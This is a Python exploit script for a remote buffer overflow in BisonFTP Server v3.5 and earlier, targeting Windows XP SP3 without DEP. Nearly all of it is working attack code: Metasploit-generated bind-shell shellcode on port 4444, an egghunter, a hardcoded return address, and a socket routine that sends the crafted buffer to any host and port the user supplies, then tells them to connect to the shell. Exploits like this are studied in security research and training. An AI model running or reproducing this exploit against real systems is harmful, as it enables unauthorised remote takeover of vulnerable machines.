#!/usr/bin/python
# BisonFTP Server <=v3.5 Remote Buffer Overflow Exploit
# original by localh0t
# full credits here: http://www.exploit-db.com/exploits/17649/
# update by lane
# Date: 03/14/2014
# Targets: Windows XP SP3 English (No DEP)
# Shellcode: Bind shell on port 4444 

from socket import *
import sys, struct, os, time

if (len(sys.argv) < 3):
	print "\nBisonFTP Server <=v3.5 Remote Buffer Overflow Exploit"
        print "\n	Usage: %s <host> <port> \n" %(sys.argv[0])
	sys.exit()

print "\n[!] Connecting to %s ..." %(sys.argv[1])

# connect to host
sock = socket(AF_INET,SOCK_STREAM)
sock.connect((sys.argv[1],int(sys.argv[2])))
sock.recv(1024)
time.sleep(5)

#Variables

# shellcode info: 368 bytes generated with "msfpayload windows/shell_bind_tcp R| msfencode -b "\x00\x0a\x0d" -a x86 -t c"
# w00tw00t in front is the indicator for the egghunter 384

shellcode = ("w00tw00t" + "\xdd\xc7\xba\xd7\x99\xe6\x1b\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x56\x31\x53\x18\x03\x53\x18\x83\xc3\xd3\x7b\x13\xe7\x33\xf2"
"\xdc\x18\xc3\x65\x54\xfd\xf2\xb7\x02\x75\xa6\x07\x40\xdb\x4a"
"\xe3\x04\xc8\xd9\x81\x80\xff\x6a\x2f\xf7\xce\x6b\x81\x37\x9c"
"\xaf\x83\xcb\xdf\xe3\x63\xf5\x2f\xf6\x62\x32\x4d\xf8\x37\xeb"
"\x19\xaa\xa7\x98\x5c\x76\xc9\x4e\xeb\xc6\xb1\xeb\x2c\xb2\x0b"
"\xf5\x7c\x6a\x07\xbd\x64\x01\x4f\x1e\x94\xc6\x93\x62\xdf\x63"
"\x67\x10\xde\xa5\xb9\xd9\xd0\x89\x16\xe4\xdc\x04\x66\x20\xda"
"\xf6\x1d\x5a\x18\x8b\x25\x99\x62\x57\xa3\x3c\xc4\x1c\x13\xe5"
"\xf4\xf1\xc2\x6e\xfa\xbe\x81\x29\x1f\x41\x45\x42\x1b\xca\x68"
"\x85\xad\x88\x4e\x01\xf5\x4b\xee\x10\x53\x3a\x0f\x42\x3b\xe3"
"\xb5\x08\xae\xf0\xcc\x52\xa7\x35\xe3\x6c\x37\x51\x74\x1e\x05"
"\xfe\x2e\x88\x25\x77\xe9\x4f\x49\xa2\x4d\xdf\xb4\x4c\xae\xc9"
"\x72\x18\xfe\x61\x52\x20\x95\x71\x5b\xf5\x3a\x22\xf3\xa5\xfa"
"\x92\xb3\x15\x93\xf8\x3b\x4a\x83\x02\x96\xfd\x83\xcc\xc2\xae"
"\x63\x2d\xf5\x41\x28\xb8\x13\x0b\xc0\xec\x8c\xa3\x22\xcb\x04"
"\x54\x5c\x39\x39\xcd\xca\x75\x57\xc9\xf5\x85\x7d\x7a\x59\x2d"
"\x16\x08\xb1\xea\x07\x0f\x9c\x5a\x41\x28\x77\x10\x3f\xfb\xe9"
"\x25\x6a\x6b\x89\xb4\xf1\x6b\xc4\xa4\xad\x3c\x81\x1b\xa4\xa8"
"\x3f\x05\x1e\xce\xbd\xd3\x59\x4a\x1a\x20\x67\x53\xef\x1c\x43"
"\x43\x29\x9c\xcf\x37\xe5\xcb\x99\xe1\x43\xa2\x6b\x5b\x1a\x19"
"\x22\x0b\xdb\x51\xf5\x4d\xe4\xbf\x83\xb1\x55\x16\xd2\xce\x5a"
"\xfe\xd2\xb7\x86\x9e\x1d\x62\x03\xae\x57\x2e\x22\x27\x3e\xbb"
"\x76\x2a\xc1\x16\xb4\x53\x42\x92\x45\xa0\x5a\xd7\x40\xec\xdc"
"\x04\x39\x7d\x89\x2a\xee\x7e\x98")

# Egghunter (!mona egg -t w00t) 32 bytes!
# Basically, look for w00t in memory and go there, hopefully executing our shellcode!

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

# JMP EBX address: 76B45073
EIP = ("\x73\x50\xB4\x76")

# padding (EIP offset 1468) 1473 total bytes available

buffer = shellcode + "A" * 716 + egghunter + "\x90" * (1468-500-32-600) + EIP + "\x90"

# send buffer
print "[!] Sending exploit..."
sock.send(buffer)
sock.recv(1024)
sock.close()
print "[!] Exploit succeed. Now netcat %s on port 4444\n" %(sys.argv[1])
sys.exit()
